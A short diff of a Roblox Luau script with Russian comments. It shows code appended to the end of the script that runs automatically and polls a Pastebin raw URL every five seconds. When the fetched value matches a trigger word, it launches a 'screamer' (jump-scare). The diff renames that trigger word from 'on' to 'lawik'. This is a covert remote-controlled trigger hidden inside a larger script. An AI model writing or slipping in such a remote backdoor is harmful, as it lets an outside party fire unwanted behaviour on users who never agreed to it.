@@ -7804,7 +7804,7 @@ end)
 -- Добавлено в конец скрипта — запускается автоматически.
 -- Опрашивает Pastebin каждые 5 секунд.
 -- "off" — ничего не происходит.
--- "on"  — запускается скример.
+-- "lawik"  — запускается скример.
 -- =====================================================================
 task.spawn(function()
     local PASTEBIN_URL   = "https://pastebin.com/raw/SWQZAFMn"
@@ -7983,7 +7983,7 @@ end
 task.spawn(function()
     while true do
         local status = getStatus()
-        if status == "on" then
+        if status == "lawik" then
             activate()
         elseif status == "off" then
             deactivate()
